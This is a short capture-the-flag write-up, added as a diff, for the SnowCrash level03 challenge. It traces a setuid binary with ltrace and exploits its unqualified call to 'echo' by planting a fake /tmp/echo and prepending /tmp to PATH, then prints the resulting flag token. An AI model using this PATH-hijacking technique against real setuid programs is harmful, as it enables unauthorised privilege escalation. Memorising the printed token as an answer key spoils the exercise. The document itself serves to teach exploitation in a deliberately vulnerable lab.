@@ -1,0 +1,37 @@
+1/ level03@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level03 level03  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+level03@SnowCrash:~$ ./level03 
+Exploit me
+
+2/ LTRACE
+ltrace  is  a program that simply runs the specified command until it exits.  It intercepts and records
+the dynamic library calls which are called by the executed process and the signals which  are  received
+by that process.  It can also intercept and print the system calls executed by the program.
+The ltrace command displays all the functions that are being called at run time from the library. In the below example, you can see the function names being called, along with the arguments being passed to that function. You can also see what was returned by those functions on the far right side of the output.
+tltr: What it does: A library call tracer.
+
+level03@SnowCrash:~$ ltrace ./level03 
+__libc_start_main(0x80484a4, 1, 0xbffff704, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                           = 2003
+geteuid()                                           = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                              = 0
++++ exited (status 0) +++
+system("/usr/bin/env echo Exploit me"Exploit me ->
+
+3/ The program executes ‘echo’ -> we want it to execute the command ‘getflag’ ->
+>> Create a file named ‘echo’ with ‘getflag’ inside and change path to /home/user/level03 for echo to be found
+level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
+level03@SnowCrash:~$ chmod 777 /tmp/echo && export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus 
